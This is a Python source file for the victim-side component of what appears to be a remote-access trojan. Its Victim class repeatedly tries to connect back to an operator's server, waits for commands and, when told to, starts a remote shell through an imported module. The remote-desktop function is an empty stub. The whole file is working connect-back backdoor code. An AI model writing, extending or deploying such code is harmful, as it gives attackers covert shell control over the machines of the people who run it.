import time
from socket import socket, AF_INET, SOCK_STREAM

from src.modlues.protocols.general import GeneralPacketType
from src.modlues.protocols.protocol import HandelPacket, Packet, PacketType
from src.modlues.remote_shell.victim_rsh import RemoteShellVictimSide


class Victim:

    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port
        self.server_addr = (self.server_ip, self.server_port)
        self.victim = socket(AF_INET, SOCK_STREAM)
        self.is_connected = False

    def main(self):
        self.__connect()
        while self.is_connected:
            packet = HandelPacket.recv_packet(self.victim)
            self.handle(packet)

    def handle(self, packet: Packet):

        print(packet, "victim main")
        if packet.packet_type == PacketType.GENERAL.value:
            if packet.packet_sub_type == GeneralPacketType.CONNECT_RSH.value:
                self.__start_remote_shell()

    def __connect(self):
        while not self.is_connected:
            try:
                self.victim.connect(self.server_addr)
                self.is_connected = True
                print(f"Connected to: {self.server_addr}")
            except Exception as e:
                time.sleep(30)

    def __start_remote_desktop(self):
        pass

    def __start_remote_shell(self):
        RemoteShellVictimSide(self.victim).main()
